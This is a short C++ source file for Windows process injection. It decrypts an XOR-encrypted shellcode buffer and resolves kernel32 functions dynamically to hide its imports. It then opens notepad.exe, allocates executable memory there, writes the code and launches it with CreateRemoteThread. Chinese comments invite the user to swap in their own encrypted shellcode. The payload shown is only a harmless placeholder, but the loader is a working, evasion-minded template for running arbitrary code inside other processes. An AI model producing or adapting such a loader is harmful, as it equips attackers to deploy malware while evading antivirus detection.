#include <iostream>
#include "safeApi.h"
#include "safeToolhelp.h"

DWORD GetProcessIdByName(LPCTSTR lpszProcessName)
{
    if (!SafeCreateProcessSnapshot())
        return 0;
    SAFE_PROCESSENTRY32 entry;
    if (!SafeProcess32First(&entry))
        return 0;
    do {
        if (lstrcmpi(lpszProcessName, entry.imageName) == 0)
            return entry.pid;
    } while (SafeProcess32Next(&entry));
    return 0;
}

// 示例：简单异或加密后的shellcode（请替换为你自己的shellcode并加密）
unsigned char encrypted_shellcode[] = { 0x90 ^ 0xAA, 0x90 ^ 0xAA, 0xC3 ^ 0xAA }; // NOP, NOP, RET
size_t shellcode_len = sizeof(encrypted_shellcode);

void decrypt_shellcode(unsigned char* dst, const unsigned char* src, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; ++i) {
        dst[i] = src[i] ^ key;
    }
}

int main()
{
    unsigned char shellcode[sizeof(encrypted_shellcode)];
    decrypt_shellcode(shellcode, encrypted_shellcode, shellcode_len, 0xAA); // 0xAA为加密key
    typedef HANDLE (WINAPI *PFN_OpenProcess)(DWORD, BOOL, DWORD);
    typedef LPVOID (WINAPI *PFN_VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL (WINAPI *PFN_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    typedef HANDLE (WINAPI *PFN_CreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

    PFN_OpenProcess pOpenProcess = (PFN_OpenProcess)SafeGetProcAddress(L"kernel32.dll", "OpenProcess");
    PFN_VirtualAllocEx pVirtualAllocEx = (PFN_VirtualAllocEx)SafeGetProcAddress(L"kernel32.dll", "VirtualAllocEx");
    PFN_WriteProcessMemory pWriteProcessMemory = (PFN_WriteProcessMemory)SafeGetProcAddress(L"kernel32.dll", "WriteProcessMemory");
    PFN_CreateRemoteThread pCreateRemoteThread = (PFN_CreateRemoteThread)SafeGetProcAddress(L"kernel32.dll", "CreateRemoteThread");

    DWORD pid = GetProcessIdByName(L"notepad.exe");
    HANDLE hProcess = pOpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    LPVOID lpBaseAddress = pVirtualAllocEx(hProcess, 0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    // 假设shellcode已定义并解密
    pWriteProcessMemory(hProcess, lpBaseAddress, shellcode, shellcode_len, NULL);
    pCreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, 0, 0, 0);
}
